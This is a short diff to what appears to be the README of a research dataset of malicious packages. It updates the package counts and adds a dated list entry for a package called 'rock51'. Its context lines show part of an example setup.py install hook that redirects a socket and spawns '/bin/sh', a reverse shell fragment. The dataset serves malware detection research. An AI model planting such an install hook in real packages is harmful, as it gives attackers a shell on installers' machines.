@@ -1,6 +1,6 @@
 ## Dataset Size
 
-This data set includes about 6,119 versions of the source code of 5,373 malicious packages.
+This data set includes about 6,120 versions of the source code of 5,374 malicious packages.
 
 ## Dataset Format
 
@@ -648,6 +648,9 @@ class myclass(install):
         os.dup2(s.fileno(), 2) 
         pty.spawn("/bin/sh") 
 ```
+
+### 26 Jun. 2024
+rock51 [1.0.0] <br>
 
 ## About the malicious packages detection
 
